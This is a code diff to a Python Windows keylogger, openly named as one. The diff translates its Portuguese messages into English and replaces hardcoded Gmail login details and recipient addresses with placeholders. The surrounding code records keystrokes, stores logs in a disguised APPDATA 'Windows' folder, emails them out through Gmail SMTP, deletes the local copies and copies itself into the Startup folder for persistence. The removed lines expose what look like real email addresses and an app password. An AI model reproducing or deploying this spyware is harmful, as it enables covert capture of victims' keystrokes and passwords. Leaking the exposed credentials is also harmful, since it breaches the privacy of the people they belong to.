@@ -15,7 +15,7 @@ def install_package(package):
     try:
         subprocess.check_call([sys.executable, '-m', 'pip', 'install', package])
     except subprocess.CalledProcessError as e:
-        print(f"Erro ao instalar o pacote {package}: {e}")
+        print(f"Erro installing the package {package}: {e}")
         sys.exit(1)
 
 def check_and_install_dependencies():
@@ -28,14 +28,14 @@ def check_and_install_dependencies():
         try:
             __import__(import_name)
         except ImportError:
-            print(f"{package_name} não está instalado. Instalando {package_name}...")
+            print(f"{package_name} is not installed. downloading {package_name}...")
             install_package(package_name)
 
 def get_appdata_roaming_directory():
     if platform.system() == 'Windows':
         return os.path.join(os.getenv('APPDATA'), 'Windows')
     else:
-        raise OSError('Este código só é suportado no Windows')
+        raise OSError('This code is not supprted in your OS')
 
 def generate_file_name():
     now = datetime.now()
@@ -66,17 +66,17 @@ def on_press(key):
 def enviar_log():
     smtp_server = 'smtp.gmail.com'
     smtp_port = 587
-    email_user = 'sync23417@gmail.com'
-    email_password = 'oxazrrefjpeevgqy'
+    email_user = 'E-mail to send the key log'
+    email_password = 'Password of the E-mail'
 
     msg = MIMEMultipart()
     msg['From'] = email_user
-    msg['To'] = 'filipe10colla@gmail.com'
-    msg['Subject'] = 'Registro de Teclas'
+    msg['To'] = 'E-mail who gonna receive the key log'
+    msg['Subject'] = 'Key Log Registry'
 
     body = f'''
-    <p>Olá,</p>
-    <p>Aqui está o conteúdo do keylogger do dia: {datetime.now().strftime("%d/%m/%Y - %H:%M")}</p>
+    <p>Hi,</p>
+    <p>Here are the key log of the day: {datetime.now().strftime("%m/%d/%Y - %H:%M")}</p>
     '''
     
     try:
@@ -92,15 +92,15 @@ def enviar_log():
         server = smtplib.SMTP(smtp_server, smtp_port)
         server.starttls()
         server.login(email_user, email_password)
-        server.sendmail(email_user, 'filipe10colla@gmail.com', msg.as_string())
+        server.sendmail(email_user, 'E-mail who gonna receive the key log', msg.as_string())
         server.quit()
-        print('Email enviado com sucesso!')
+        print('Email send with success!')
 
         for log_file in os.listdir(log_directory):
             log_path = os.path.join(log_directory, log_file)
             if os.path.isfile(log_path):
                 os.remove(log_path)
-                print(f'Arquivo {log_file} excluído.')
+                print(f'File {log_file} deleted.')
 
     except Exception as e:
         print(f"Erro ao enviar o e-mail: {e}")
@@ -118,7 +118,7 @@ def copy_to_startup():
         destination = os.path.join(startup_folder, os.path.basename(current_exe))
         if not os.path.exists(destination):
             shutil.copyfile(current_exe, destination)
-            print(f"Cópia do arquivo {current_exe} para {destination} concluída com sucesso.")
+            print(f"Copy of the file {current_exe} to {destination} conclued with success.")
 
 if __name__ == "__main__":
     
